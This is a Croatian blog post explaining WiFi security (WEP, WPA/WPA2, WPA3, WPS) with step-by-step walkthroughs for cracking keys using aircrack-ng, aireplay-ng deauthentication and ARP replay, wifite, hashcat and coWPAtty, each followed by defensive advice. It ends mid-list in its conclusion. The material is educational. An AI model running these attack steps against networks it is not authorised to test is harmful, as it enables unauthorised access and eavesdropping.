---
layout: post
title:  "Računalne mreže - Sigurnost bežičnih mreža"
date:   2020-05-31 05:45:00 +0100
categories: racunalne-mreze wifi wep wpa wpa2 wps
permalink: /racunalne-mreze/wifi-security/
toc: true
---

<style>

.table-responsive {
  display: block;
  width: 100%;
  overflow-x: auto;
  -webkit-overflow-scrolling: touch;
}

.alert {
  position: relative;
  padding: 0.5rem 1.25rem;
  margin-bottom: 1rem;
  border: 1px solid transparent;
  border-radius: 0.25rem;
}

.alert-danger {
  color: #721c24;
  background-color: #f8d7da;
  border-color: #f5c6cb;
}

.alert-warning {
  color: #856404;
  background-color: #fff3cd;
  border-color: #ffeeba;
}

.text-center {
  text-align: center !important;
}

blockquote{
  font-style: normal !important;
}

.center-img
{
    margin: 0 auto;
    display: block;
}

.tool {
  position: relative;
  display: inline-block;
  border-bottom: 1px dotted black; /* If you want dots under the hoverable text */
  text-decoration: none;
}

.alert-success {
  color: #155724;
  background-color: #d4edda;
  border-color: #c3e6cb;
}

</style>

<div class="alert alert-danger text-center">
  <strong>UPOZORENJE!</strong>
  <p>Svi postupci opisani u ovom članku i videozapisima služe isključivo u edukativne i informativne svrhe!
  Ako ih odlučite koristiti za nezakonite radnje, koristite ih na vlastitu odgovornost. <strong>Zloupotreba je kažnjiva!</strong></p>
</div>

# Bežične mreže - WiFi


WiFi je najčešće korištena tehnologija za bežičnu komunikaciju. Bazirana je na IEEE 802.11 standardu i kontinuirano se razvija. 

WiFi je zaštitni znak tvrtke WiFi Alliance, što ograničava korištenje izraza <cite>WiFi Certified</cite> samo na proizvodima koji su certificirani za korištenje ove tehnologije.

WiFi koristi radio valove za prijenos informacija na posebnim frekvencijama (starije verzije koriste 2.4 GHz, novije 5 GHz ili kombiniraju obje).

<div class="table-responsive">
<table>
<thead>
  <tr>
    <th colspan="7">IEEE 802.11 protokol</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>Standard</td>
    <td>802.11a</td>
    <td>802.11b</td>
    <td>802.11g</td>
    <td>802.11n (WiFi 4)</td>
    <td>802.11ac (WiFi 5)</td>
    <td>802.11ax (WiFi 6)</td>
  </tr>
  <tr>
    <td>Prihvaćen</td>
    <td>1999</td>
    <td>1999</td>
    <td>2003</td>
    <td>2009</td>
    <td>2014</td>
    <td>2019</td>
  </tr>
  <tr>
    <td>Frekvencija</td>
    <td>5 GHz</td>
    <td>2.4 GHz</td>
    <td>2.4 GHz</td>
    <td>2.4/5 GHz</td>
    <td>5 GHz</td>
    <td>2.4/5 GHz</td>
  </tr>
  <tr>
    <td>Max. brzina prijenosa</td>
    <td>54 Mbps</td>
    <td>11 Mbps</td>
    <td>54 Mbps</td>
    <td>600 Mbps</td>
    <td>1 Gbps</td>
    <td>1.2 Gbps</td>
  </tr>
  <tr>
    <td>Doseg (zatvoreni prostor)</td>
    <td>&asymp;30  m</td>
    <td>&asymp;30 m</td>
    <td>&asymp;38 m</td>
    <td>&asymp;68 m</td>
    <td>&asymp;28 m</td>
    <td>&asymp;</td>
  </tr>
  <tr>
    <td>Doseg (otvoreni prostor)</td>
    <td>&asymp;122 m</td>
    <td>&asymp;138 m</td>
    <td>&asymp;138 m</td>
    <td>&asymp;252 m</td>
    <td>&asymp;305 m</td>
    <td>&asymp;</td>
  </tr>
</tbody>
</table>
</div>

* vrijednosti mogu varirati ovisno o proizvođaču mrežne opreme

![wifi network](/assets/rm/wifi/wifi_net.png)

***Basic service set (BSS)*** je najmanji dio bežične mreže koji se sastoji od bežičnih mrežnih čvorova (***station***) koji 
djeluju koristeći jednake protokole za pristup mreži.

***BSS*** može biti izoliran, ili povezan na *okosnicu* **distribucijskog sustava** (***DS***) kroz **pristupnu točku** (***AP***)

Sljedeći izrazi se koriste prilikom dijagnostike ili testiranja ranjivosti bežičnih mreža u raznim aplikacijama.

**BSSID** - jedinstveni identifikator mreže, MAC adresa pristupne točke

**ESSID** - naziv pristupne točke

Bežične mreže mogu biti **nezaštićene** (*otvorene*) ili zaštićene. Zaštita mreže se obavlja kriptiranjem podataka koji se prenose 
mrežom i za pristup mreži je potrebno znati **sigurnosni ključ** ili posjedovati neku vrstu certifikata (*kriptiranje koji se najčešće koristi u poslovne svrhe*).
Tijekom godina razvoja IEEE 802.11 protokola, nastale su različite verzije zaštite mreže za privatne i poslovne korisnike.

## WEP zaštita

**WEP (Wireless Encryption Protocol)** je protokol za zaštitu bežičnih mreža, opisan IEEE standardom 802.11b.
WEP zaštita odnosi se na fizički i sloj podatkovne veze (OSI model računalne mreže) u
računalnoj mreži, a temelji se na enkripciji podataka između krajnjih točaka.
WEP koristi kriptografske ključeve standardnih duljina od 64, 128 i 256 bita. Optimalna duljina ključa je ona koja onemogućuje
njegovo otkrivanje (što veća), a da se enkripcija istovremeno može obaviti što brže (što manja).
Kriptiranje i dekriptiranje podatka obavlja se tajnim ključem u krajnjim točkama, a protokol uključuje
provjeru integriteta poruke i provjeru identiteta korisnika, odnosno metode kojima se može utvrditi je li
poruka bila mijenjana između izvorišta i odredišta.

WEP enkripcija koristi **RC4 sustav** za kriptiranje podatkovnih tokova, koji na temelju ključa stvara
*nasumičan niz* kojim se pomoću **XOR funkcije** kriptira ulazna poruka. Poznavanjem ključa moguće je upotrebom iste funkcije niz dekriptirati na odredištu. 

Slaba točka WEP protokola upravo je enkripcija podataka. Ako napadač ima mogućnost prisluškivanja mreže te zna kako se stvara niz u RC4
algoritmu, kriptoanalizom može otkriti WEP ključ. Kako bi se izbjeglo ponavljanje nizova kojima se
kriptiraju podaci uz ključ se u RC4 poruci šalje i proizvoljni **inicijalizacijski vektor (IV)** veličine 24 bita. 
Mreže koje imaju veliki promet moraju generirati veliki broj inicijalizacijskih vektora, pa postoji velika
vjerojatnost ponavljanja istog niza (npr. isti niz ponovit će se s vjerojatnošću od 50% nakon 5000 kriptiranih paketa). 

![WEP](/assets/rm/wifi/wep-1.png)

> **Zanimljivost**
>
> U početku su svi kućni usmjernici dolazili sa zadanim postavkama proizvođača. 
> Te su postavke najčešće bile minimalne (otvorena mreža ili WEP) i često su se ponavljale ili mogle predvidjeti, što predstavlja
> veliki sigurnosni rizik.
>
> Neki su telekom operateri, odnosno njihova služba za korisnike, u vrijeme dok je još bio aktualan JMBG 
> (jedinstveni matični broj građana) korisnicima "preporučivali" da za WEP ključ postave upravo svoj JMBG, jer je
> odgovarao zahtjevima za duljinu ključa od 13 znakova (128 bitni WEP ključ). Kako su računala vrlo spretna sa brojevima,
> takav ključ im unatoč svojoj duljini nije predstavljao veliki problem. Tako je napadač osim pristupa vašoj mreži,
> dobio i uvid u JMBG (<a href ="https://hr.wikipedia.org/wiki/Mati%C4%8Dni_broj_gra%C4%91ana" target="_blank">koji je o vama otkrivao
> neke stvari</a>). Danas se takva praksa izbjegava.

### Probijanje WEP zaštite

<style>.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }</style><div class='embed-container' style="margin-bottom: 1rem;"><iframe src="https://www.youtube-nocookie.com/embed/svCa25vaN8g" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>

> **Opis napada**
> 
> Ovaj napad se bazira na interaktivnom prosljeđivanju posebnih ARP paketa koji omogućavaju da pristupna točka generira
> nove inicijalizacijske vektore (IV). Tijekom odašiljanja takvih paketa, biti će pokrenuto snimanje paketa koje pošalje
> pristupna točka. Iz prikupljenih paketa je moguće izračunati ključ za pristup i enkripciju podataka.

1. korak - pokrenuti airmon-ng i ispisati popis dostupnih wlan sučelja

    `sudo airmon-ng`

2. korak - pokrenuti 'Monitor Mode' na sučelju wlan0
  
    **Ako postoje procesi koji koriste karticu (ispiše se upozorenje u prethodnom koraku), ugasiti ih pomoću naredbe:**
    `sudo airmon-ng check kill `

    `sudo airmon-ng start wlan0`

3. korak - ispisati sve WiFi mreže koje hvata mrežna kartica

    `sudo airodump-ng wlan0mon`

    **Obavezno napisati** `wlan0mon` **jer je to sučelje koje se koristi za 'Monitor Mode'**

4. korak - zapisati podatke o mreži dobivene u prethodnom koraku

    - BSSID
    - kanal (CH)
    - ESSID (nije nužno)

    Nakon toga prekinuti skeniranje sa CTRL + C.

5. korak - pokrenuti prikupljanje paketa za željenu mrežu

    napraviti novi direktorij sa naredbom `mkdir direktorij` i prebaciti se u njega sa naredbom `cd direktorij`
    
    `sudo airodump-ng --bssid BSSID_mreže -w ESSID_mreže -c Kanal_mreže wlan0mon`

    - `-bssid -> BSSID mreže (MAC adresa routera)`

    - `-w -> naziv datoteke u koju će se pohraniti paketi (u trenutnom direktoriju)`

    - `-c -> kanal na kojem je mreža`

    - `wlan0mon -> sučelje za prikupljanje paketa`

    Otvoriti novi terminal (NE ZATVARATI ili prekidati airodump):
    
    `sudo aireplay-ng -1 0 -a BSSID_mreže wlan0mon` - napad <a href="https://www.aircrack-ng.org/doku.php?id=fake_authentication">*lažnom autentifikacijom*</a>

    Nakon što postupak uspješno završi ("Association successful"), pokrenuti:
    
    `sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b BSSID_mreže wlan0mon`

    Nakon nekog vremena, program ispisuje podatke o prikupljenom paketu i pita korisnika želi li koristiti taj paket. Potvrditi sa 'y'.
    
    Kada `airodump` prikupi **više od 10.000 paketa (#Data)**, krenuti na slijedeći korak.

    Prethodno pokrenute programe nije potrebno prekidati, ali je moguće kombinacijom CTRL + C. Nije preporučljivo!

    Ako nije prikupljen dovoljan broj paketa, potrebno je ponoviti postupak od 5. koraka.

6. korak - dekriptiranje ključa

    Nakon što airodump-ng prikupi više od 10.000 #Data paketa, moguće je dekriptirati ključ
    
    *Naziv datoteke potrebne aircracku provjeriti sa naredbom* `ls`
    
    `aircrack-ng Naziv_datoteke-01.cap`

    Ako je postupak uspješan, aircrack ispisuje poruku:

    `KEY FOUND! [ključ u heksadekadskom zapisu]`
    
    `(ASCII: ASCII vrijednost ključa, ako postoji)`

    Ako nije, program ispisuje da se ponovni metoda za pribavljanje paketa sa većim brojem paketa.

<p class="alert alert-danger text-center"><strong><i>Zaključak</i>: izbjegavajte korištenje WEP zaštite i mreže koje ju koriste!</strong></p>

## WPA / WPA2 zaštita

**WPA** (*Wi-Fi Protected Access*) je sustav zaštite bežičnih mreža, opisan u okviru IEEE 802.11i
standarda, koji omogućuje enkripciju podataka i provjeru identiteta korisnika. Kao i WEP, i WPA
koristi **RC4** sustav za kriptiranje podataka i to uz **128-bitni ključ** i **48-bitni inicijalizacijski vektor (IV)**.
Prednost nad WEP standardom je u korištenju **TKIP protokola** (*Temporal Key Integrity Protocol*), koji dinamički mijenja 
ključeve za vrijeme korištenja sustava. Kombinacijom dugog **inicijalizacijskog vektora (IV)**
i **TKIP protokola** sustav se lakše brani od napada kakvi se koriste za otkrivanje ključa kod **WEP** protokola. 
Slabosti **WEP** zaštite ležale su u premalom broju mogućih inicijalizacijskih vektora koji su uz isti tajni ključ davali
nesigurne nizove podataka -> analizom tih nizova bilo moguće otkriti vrijednosti ključa. Na ovaj
način novi algoritam napada gotovo je nemoguće iskoristiti.

![WPA](/assets/rm/wifi/tkip.png)

**WPA** protokol također donosi i sigurniji sustav provjere poruke u odnosu na **CRC** (*Cyclic Redundancy Check*) sustav koji
se koristi kod **WEP** protokola. Kod **CRC** provjere napadač može promijeniti sastav poruke koja se šalje i
vratiti vrijednost CRC-a na izvornu, čak i bez poznavanja ključa kojim je poruka kriptirana. Sigurniji
način provjere je korištenje **MIC** (*Message Integrity Code*) koji u **WPA** uključuje
brojač okvira čime se isključuje mogućnost promjene sastava poruka.

U studenom 2008. godine otkrivena je **ranjivost** **TKIP protokola** koju napadač može iskoristiti za
otkrivanje niza bitova kojima je kriptiran određeni paket. Napad je pritom moguće izvesti samo na
kratkim porukama većinom poznatog sadržaja kao što su **ARP** (*Address Resolution Protocol*)
poruke za otkrivanje MAC adrese na temelju mrežne adrese uređaja.

<hr>

**WPA2** je najrašireniji sustav zaštite bežičnih lokalnih mreža, a razvijen je u okviru Wi-Fi Alliance udruženja 2004. godine. **WPA2** je inačica WPA protokola nastalog u okviru iste organizacije. **WPA2** se kao i WPA temelji na IEEE 802.11i
standardu i uključuje sve mehanizme koje koristi **WPA** s time da uvodi i dodatna poboljšanja, kao što je
CCMP enkripcija. 

**WPA** protokol sadržavao je i **EAP** (*Extensible Authentication Protocol*) autentifikacije.
Ona je zadržana i kao dio **WPA2** protokola. **EAP** definira format poruka koje se izmjenjuju prilikom
bežične autentifikacije. Protokoli koji koriste **EAP** metodu moraju definirati način na koji će se te
poruke enkapsulirati u podatkovne pakete. Ova metoda autentifikacije izvodi se na *sloju podatkovne veze*
kao **PPP** (*Point-to-Point Protocol*) protokol. Prilikom autentifikacije se izvodi i razmjena ključeva pomoću
kojih će se kriptirati podaci koji se šalju.
WAP2 autentifikacije izvodi se dinamičkim protokolom koji uključuje **razmjenu u četiri koraka** (**Handshake**) – svi potrebni podaci kojima se jamči sigurnost kasnije komunikacije razmjenjuju se u četiri poruke.
Nakon što se EAP autentifikacijom razmjeni **PMK** (*Pairwise Master Key*) ključ, on se koristi za razmjenu **PTK**
(*Pairwise Transient Key*) ključeva koji se zatim mogu koristiti za enkripciju...

Koraci CCMP enkripcije:

1. podijeliti sadržaj na blokove
2. prepisati zaglavlje i broj paketa u izlaznu poruku
3. pomoću AES algoritma i brojača kriptirati blokove i zapisati ih u izlaznu poruku
4. pomoću AES algoritma i inicijalizacijskog vektora izračunati MIC i zapisati ga iza podataka u izlaznu poruku
5. izračunati niz za provjeru okvira (FCS) i zapisati ga na kraj poruke.

Koraci CCMP dekripcije:

1. pročitati zaglavlje, broj paketa i FCS broj
2. provjeriti FCS paketa
3. podijeliti sadržaj na blokove
4. pomoću brojača i AES-a dekriptirati blokove
5. pomoću AES-a i inicijalizacijskog vektora izračunati MIC i usporediti s onim zapisanim u paketu 

**WPA** i **WPA2** protokoli mogu se koristiti na dva načina:

1. **PSK** (*Pre-Shared Key*)
   - 256-bitni ključ
   - razmjena ključeva između pristupne točke i klijenata 
   - namijenjen je privatnim mrežama ili manjim poslovnim mrežama
   - jednostavniji za izvedbu (ne zahtijeva autentifikacijski poslužitelj)
   - ključ može biti niz od 8 do 63 ASCII znakova
     - za 256 znakova postoji ~10<sup>78</sup> mogućih kombinacija, ključ je nemoguće izračunati iz *hash* vrijednosti u realnom vremenu
       - ako korisnik unese predvidljive nizove znakova (ili samo znamenke), tada napadačima otkrivanje ključa olakšava **„brute force” napad** kojim se provjeravaju sve moguće kombinacije nizova znakova i znamenki
  
2. **Enterprise**
   
   - podrazumijeva zaseban ključ između pristupne točke i svakog klijenta
   - svaki uređaj u mreži mora autentificirati (identificirati i potvrditi identitet lozinkom)
   - održavanje takvog sustava zahtijeva mnogo više vremena
   - autentifikacijski poslužitelj koristi **RADIUS** (*Remote Authentication Dial In User Service*) protokol za centraliziranu autentifikaciju 

> **Zanimljivost**
>
> Postoje <a href="https://www.nickkusters.com/en/Services/Thomson-SpeedTouch" target="_blank">web aplikacije</a> u koje je 
> moguće unijeti zadani naziv WiFi mreže, a aplikacija vraća 1 ili više kombinacija ključeva
> koje mogu odgovarati tom usmjerniku. Kako je proizvođač koristio slabe algoritme za generiranje ključeva, moguće ih je izračunati
> posebnim algoritmom iz naziva WiFi mreže. Unatoč tome što korisnik koristi WPA ili čak WPA2 zaštitu, ključ je moguće izračunati.

### Probijanje WPA2 zaštite - Brute Force napad

<style>.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%;}</style><div class='embed-container' style="margin-bottom: 1rem;"><iframe src="https://www.youtube-nocookie.com/embed/d8N4JDdrCUg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>

> **Opis napada**
> 
> Ovaj napad je izveden pomoću alata **Wifite** koji automatski obavlja različite napade koje može izvesti uz pomoć drugih alata
> koji su instalirani u sklopu Kali Linux OS-a. Napad koji je u ovom slučaju bio uspješan je **WPA Handshake Capture** napad koji
> je moguće izvesti **samo** ako je barem **1 klijent** povezan na pristupnu točku. Tijekom izvođenja, klijentu šalje tzv. **Deauth**
> pakete, koje pristupne točke šalju kada se klijent ponovno mora identificirati i proći autentifikaciju.
> Alati tada *slušaju* i prikupljaju **Handshake**  pakete (postupak u kojem pristupna točka i klijent razmjenjuju 
> informacije potrebne za sigurnu, enkriptiranu komunikaciju) i kada prikupi dovoljno paketa, pokušat će dekriptirati WPA/WPA2 ključ.
>
> Napomena: klijentu kojem alat šalje **Deauth** pakete će privremeno izgubiti vezu s Internetom, pa je ovaj napad **vrlo uočljiv**.
> 
> Nakon što se prikupi dovoljan broj paketa, moguće je dekriptirati ključ pomoću **Hashcat** alata. **Hashcat**, kako mu i ime kaže,
> je alat koji radi s *hash* vrijednostima, a WPA/WPA2 ključ je enkriptiran pomoću posebnog algoritma i u paketima se prenosi kao *hash*
> vrijednost -> ključ se izračunava, za što je potrebna veća procesorska snaga pa se umjesto CPU-a koristi GPU koji izračun može
> obaviti brže nego CPU.

1. korak - pokrenuti airmon-ng i ispisati popis dostupnih wlan sučelja

    `sudo airmon-ng`

2. korak - **Ako postoje procesi koji koriste karticu (ispiše se upozorenje u prethodnom koraku), ugasiti ih**
    
    `sudo airmon-ng check kill `

3. korak - pokrenuti alat **wifite2**

    `sudo wifite`

4. korak - odabrati željenu mrežu
5. korak - pričekati da se izvrše automatski napadi
6. korak - nakon što **wifite2** završi s *napadom pomoću rječnika*, pretvoriti snimljene pakete u format pogodan za alat **Hashcat**

    <a href="https://hashcat.net/cap2hccapx/">Hashcat WPA/WPA2 pcap converter</a>

    Preuzetu datoteku spremiti u direktorij.

7. korak - dekriptirati ključ pomoću alata **Hashcat**
   
    - postupak za Windows OS (AMD64):
    
    `hashcat64 -m 2500 -a3 capture.hccapx ?d?d?d?d?d?d?d?d`

      - `-m 2500` => način rada za WPA/WPA2 dekriptiranje
      - `-a3` => brute force napad
      - `capture.hccapx` => pretvorena datoteka koja sadrži WPA Handshake
      - `?d?d?d?d?d?d?d?d` => predložak po kojem će se "pogađati" ključ (8 znamenki)

8. korak - prikazat će se dekriptirani WPA/WPA2 ključ

<p class="alert alert-danger text-center"><strong><i>Zaključak</i>: izbjegavajte korištenje WPA/WPA2 ključeva koji se sastoje samo od brojeva
</strong></p>

### Probijanje WPA2 zaštite - Dictionary napad

<style>.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%;}</style><div class='embed-container' style="margin-bottom: 1rem;"><iframe src="https://www.youtube-nocookie.com/embed/fBw181LApuM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>

> **Opis napada**
> 
> Ovaj napad je izveden pomoću alata **Wifite** kao i prethodni napad, jedina razlika je u načinu otkrivanja ključa. Sada se pomoću
> rječnika često korištenih ključeva pokušava otkriti koji ključ odgovara ključu koji koristi mreža.

1. korak - pokrenuti **wifite2**

    `sudo wifite --kill`

2. korak - odabrati željenu mrežu

3. korak - pričekati da se izvrše automatski napadi

4. korak - nakon što **wifite2** završi s *napadom pomoću rječnika*, pretvoriti snimljene pakete u format pogodan za alat **Hashcat**

    <a href="https://hashcat.net/cap2hccapx/">Hashcat WPA/WPA2 pcap converter</a>

    Preuzetu datoteku spremiti u direktorij.

5. korak - dekriptirati ključ pomoću alata **Hashcat**
   
    - postupak za Windows OS (AMD64):
    
    `hashcat64 -m 2500 -a0 capture.hccapx rockyou.txt`

      - `-m 2500` => način rada za WPA/WPA2 dekriptiranje
      - `-a0` => Dictironary napad
      - `capture.hccapx` => pretvorena datoteka koja sadrža WPA Handshake
      - `rockyou.txt` => *Dictionary* - rječnik

### Probijanje WPA2 zaštite - napad Rainbow tablicama

<style>.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%;}</style><div class='embed-container' style="margin-bottom: 1rem;"><iframe src="https://www.youtube-nocookie.com/embed/QJTDanR_9MQ" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>

> **Opis napada**
> 
> Ovaj napad je izveden pomoću alata **Wifite** koji automatski obavlja različite napade koje može izvesti uz pomoć drugih alata
> koji su instalirani u sklopu Kali Linux OS-a. Napad koji je u ovom slučaju bio uspješan je **WPA Handshake Capture** napad koji
> je moguće izvesti **samo** ako je barem **1 klijent** povezan na pristupnu točku. Tijekom izvođenja, klijentu šalje tzv. **Deauth**
> pakete, koje pristupne točke šalju kada se klijent ponovno mora identificirati i proći autentifikaciju.
> Alati tada *slušaju* i prikupljaju **Handshake**  pakete (postupak u kojem pristupna točka i klijent razmjenjuju 
> informacije potrebne za sigurnu, enkriptiranu komunikaciju) i kada prikupi dovoljno paketa, pokušat će deriptirati WPA/WPA2 ključ.
>
> Napomena: klijentu kojem alat šalje **Deauth** pakete će privremeno izgubiti vezu s Internetom, pa je ovaj napad **vrlo uočljiv**.
> 
> Nakon što se prikupi dovoljan broj paketa, moguće je dekriptirati ključ pomoću **Rainbow tablica** i **coWPAtty** alata. **coWPAtty** čita vrijedosti *hasheva*
> pohranjenih u tablici i uspoređuje ih s onima koji su prenešeni tijekom **Handshake**a.
> **Rainbow tablice** se mogu napraviti prije ili nakon prikupljanja paketa, što omogućuje da se otkrivanje ključa odvije i bez komunikacije s pristupnom točkom.
> U njima se pohranjuju *hash* vrijednosti ključeva za mrežu. Ovisno o uzetom uzorku za odabir ključeva, tablica može biti vrlo velika i za njeno kreiranje može biti
> potrebno dulje vrijeme.
> Prilikom kreiranja tablice, napadač mora znati točan **naziv mreže** jer se naziv mreže koristi prilikom generiranja *hash* vrijednosti koje se razmjenjuju između
> pristupne točke i klijenta tijekom povezivanja na mrežu. 

1. korak - pokrenuti airmon-ng i ispisati popis dostupnih wlan sučelja

    `sudo airmon-ng`

2. korak - **Ako postoje procesi koji koriste karticu (ispiše se upozorenje u prethodnom koraku), ugasiti ih**
    
    `sudo airmon-ng check kill `

3. korak - pokrenuti alat **wifite2**

    `sudo wifite`

4. korak - odabrati željenu mrežu
5. korak - pričekati da se izvrše automatski napadi
6. korak - dekriptirati ključ pomoću alata **coWPAtty**
   1. provjeriti naziv datoteke pohranjene u direktoriju **hs**

      `ls hs/`

   2. pokrenuti alat **coWPAtty**
   
      `sudo cowpatty -r hs/handshake.cap -d ZyXEL.hash -s "ZyXEL"`

      - `-r` = opcija za korištenje datoteke koja sadržava mrežne pakete
      - `hs/handshake.cap` = datoteka koja sadržava **WPA Handshake**
      - `-d` = opcija za korištenje **Rainbow tablice**
      - `ZyXEL.hash` = <a href="https://www.renderlab.net/projects/WPA-tables/" target="_blank"><strong>Rainbow tablica</strong></a>
      - `-s "ZyXEL"` = naziv željenje mreže


7. korak - ako je **Rainbow tablica** sadržavala vrijednost ključa koji je koristila napadnuta mreža, **coWPAtty** će ispisati vrijednost ključa.

<p class="alert alert-danger text-center"><strong>Zaključak: izbjegavajte korištenje jednostavnih ili zadanih naziv mreže kao što su: <code>default</code>; nazivi proizvođača opreme: <code>ZyXEL</code>, <code>Linksys</code> i ostala lako predvidljiva imena!<br>Za većinu takvih mreža <a href="https://www.renderlab.net/projects/WPA-tables/" target="_blank">već postoje Rainbow tablice</a> koje omogućavaju brzo otkrivanje WPA/WPA2 ključa pomoću alata kao što je coWPAtty.
</strong></p>

### Napadi ponovnom instalacijom ključa

Mathy Vanhoef i Frank Piessens otkrili su ranjivost u WPA2 protokolu. Napadač koji se nalazi u blizini klijenta može iskoristiti te ranjivosti koristeći napad ponovnom instalacijom ključa, i pri tome pročitati sve informacije za koje se smatra da su zaštićene enkripcijom, što se može iskoristiti za krađu povjerljivih informacija. Napad je moguće izvesti na svim modernim WiFi mrežama koji koriste WPA2 protokol. Ovisno o konfiguraciji mreže, moguće je i manipulirati podatcima koji se prenose mrežom.

Ranjivosti se nalaze u samome WiFi standardu, a ne u njegovoj implementaciji kod uređaja. Napad se koristi manipulacijom porukama koje se šalju mrežom i klijentu šalje kriptografski ključ koji se već upotrebljava, što omogućava da se pojedini parametri ponovno postave na zadanu vrijednost. Kako se sve informacije sada enkriptiraju već korištenim ključem koji je napadaču poznat, napadač njime može napraviti dekripciju poslanih podataka.

Kako bi se onemogućilo izvršavanje ovog napada na uređaju, autori preporučuju ažuriranje pogonskih programa bežičnih mrežnih kartica.

Detaljnije o napadu: <a href="https://www.krackattacks.com/"><quote>KRACK Attacs</quote></a>, Mathy Vanhoef, Frank Piessens

## WPA3

U siječnju 2018. godine WiFi Alliance je objavio novu generaciju protokola za zaštitu bežičnih mreža, **WPA3**. Novi protokol koristio bi nove kriptografske algoritme za enkripciju podataka i ključa, i umjesto dosad standardnog **WPA Handshake**-a, koristio bi **SAE** (*Simultaneous Authentication of Equals*) metodu za razmjenu ključeva (često nazivan *Dragonfly Handshake*), što je trebalo povećati sigurnost mreže i olakšati konfiguraciju uređaja.

U <a href="https://wpa3.mathyvanhoef.com/" target="_blank">travnju 2019. godine Mathy Vanhoef i Eyal Ronen</a> otkrili su **ranjivosti** u **Dragonfly Handshake-u**, što je pokazalo da unatoč naporima WiFi Alliance nije postigao željeni uspjeh za povećanjem sigurnosti bežičnih mreža.

Nakon objave istraživanja ovih ranjivosti, WiFi Alliance je objavila <a href="https://wpa3.mathyvanhoef.com/WPA3_Security_Considerations_20190410.pdf" target="_blank">preporuke</a> za obranu od ovakvih napada, ali autori su otkrili još novih ranjivosti u **WPA3** protokolu koji su proizašli iz implementacije tih preporuka. 

Njihova su istraživanja potaknula rad na novim sigurnosnim protokolima koji će biti korišteni u novijim implementacijima **WPA3 protokola**.

## WPS

**WPS** (*WiFi Protected Setup*) je bežični standard za uspostavljanje veze između usmjernika ili pristupne točke i bežičnih uređaja predstavljen je početkom 2007. s ciljem omogućavanja kućnim korisnicima brzo postavljanje sigurnosnih postavki za povezivanje bežičnih uređaja u mreži.

Dvije osnovne metode za povezivanje pomoću **WPS**-a: unos PIN-a, obvezna metoda za sve WPS certificirane uređaje; pritiskom na stvarnu tipku (*Push – Button* - **PBC** ) na usmjerniku ili kroz simuliranu tipku u softveru. Informacije o mreži se razmjenjuju pomoću **EAP** protokola. **WPS** ne pruža podršku za bežične mreže koje koriste zastarjeli **WEP** protokol, već samo novije WPA/WPA2 protokole.

**WPS** je odlična mogućnost za povezivanje, ali njegova izvedba s pogleda sigurnosti je vrlo loša jer vrlo je ranjiv kroz različite napade. Postoji više aplikacija koje iskorištavaju propuste u njegovim slabim algoritmima, tako da je moguće pomoću tih ranjivosti dobiti ključ mreže.

**WPS** protokol tijekom razmjene informacija (poruka **M4**) o PIN-u (8 znamenki) za pristup, prvo provjerava 1. polovicu primljenog PIN-a, i šalje poruku je li ta polovica ispravna (**NACK**) ili ne (**M5**). Kako se 2. polovica PIN-a sastoji od 4 znamenke (od kojih je zadnja polje za provjeru), nakon što napadač sazna 1. polovicu PIN-a (10.000 kombinacija), vrlo lako će izračunati i 2. polovicu za koju mu treba samo 1.000 pokušaja jer je zadnja, 8. znamenka kao polje provjere smanjila broj potrebnih kombinacija. Kada napadač
konačno posjeduje cijeli PIN za pristup, zatražit će od usmjernika informacije o konfiguraciji mreže koja sadržava i ključ za pristup mreži.

![WPS](/assets/rm/wifi/wps.png){: .center-img }

Ovakav **brute-force** algoritam uređaji najčešće nisu zaustavljali niti prepoznali, tako da napadač može saznati ključ mreže kroz nekoliko sati.
U nekim slučajevima, nakon što je napadač saznao ključ mreže, usmjernik bi bio "onesposobljen" za normalan rad i trebalo ga je ponovno
pokrenuti.

Kasnije je kroz WPS 2.0 zakrpan dio ranjivosti, ali i dalje postoje uređaji određenih proizvođača koji su ranjivi na **Pixie Dust** napad.

**Pixie Dust** napad je moguće izvesti samo na uređajima nekih proizvođača koji su loše implementirali sigurnosne mehanizme za WPS protokol. Pomoću njega napadači su uspjeli kroz nekoliko minuta saznati ključ za pristup mreži.

### Probijanje WPS protokola

<style>.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%;}</style><div class='embed-container' style="margin-bottom: 1rem;"><iframe src="https://www.youtube-nocookie.com/embed/6SJNaFPB0OM" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>

> **Opis napada**
> 
> Ovaj napad je izveden pomoću alata **Wifite** koji automatski obavlja različite napade koje može izvesti uz pomoć drugih alata
> koji su instalirani u sklopu Kali Linux OS-a. Kako je ovaj napad ciljan na WPS prokotol, korišten je alat **reaver** koji obavlja
> **"brute force"** ili **Pixie Dust** napad kako je opisano ranije u članku.
> 
> Kako **reaver** nije uspio pronaći ključ putem WPS napada i uređaj je zaključao povezivanje WPS protokolom, zaključujem 
> da moj kućni usmjernik nije ranjiv na trenutno dostupne napade, što znači da je 
> njegov <abbr class="tool" title="Huawei Technologies Co., Ltd. 😉">proizvođač</abbr> **uspješno** ugradio sigurnosne mehanizme.

## Zaključak

<div class="alert alert-warning">
  <p><strong>Prilikom konfiguracije bežičnih mreža, preporučljivo je:</strong></p>
  <ol>
    <li>
    Promijeniti zadano ime pristupne točke ili ga <abbr class="tool" title="za napredne korisnike">sakriti</abbr>:
    <ul>
